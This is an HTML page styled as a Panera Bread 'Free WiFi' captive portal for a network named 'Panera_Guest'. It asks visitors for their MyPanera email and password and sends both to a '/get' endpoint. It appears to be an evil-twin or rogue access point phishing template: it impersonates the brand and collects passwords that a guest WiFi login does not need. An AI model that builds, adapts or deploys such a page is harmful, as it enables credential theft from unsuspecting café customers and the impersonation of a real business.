<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f7f3ed;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.top{width:100%;max-width:420px;background:#5BAD53;border-radius:14px 14px 0 0;padding:22px 24px;text-align:center}
.top h1{font-size:22px;font-weight:800;color:#fff;letter-spacing:0.5px}
.top p{font-size:12px;color:rgba(255,255,255,0.8);margin-top:3px}
.card{background:#fff;width:100%;max-width:420px;border-radius:0 0 14px 14px;box-shadow:0 12px 40px rgba(0,0,0,0.1);overflow:hidden}
.cb{padding:26px 24px 22px}
.badge{display:flex;align-items:center;gap:10px;background:#f0faf0;border:1px solid #c8e6c8;border-radius:8px;padding:10px 13px;margin-bottom:22px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
h2{font-size:18px;font-weight:700;color:#2d5a27;margin-bottom:4px}
.subh{font-size:13px;color:#888;margin-bottom:10px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#5BAD53;box-shadow:0 0 0 3px rgba(91,173,83,0.12)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#5BAD53}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#5BAD53;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
.foot{background:#f7f3ed;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#5BAD53;text-decoration:none}
</style>
</head>
<body>
<div class="top"><h1>Panera Bread</h1><p>Free WiFi for our guests</p></div>
<div class="card">
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>Panera_Guest</strong></span></div>
    <h2>Welcome to Panera</h2><p class="subh">Sign in with your MyPanera account to connect.</p>
    <form action="/get">
      <label class="lbl">MyPanera Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Panera Bread</span><a href="#">Help</a></div>
</div>
</body>
</html>
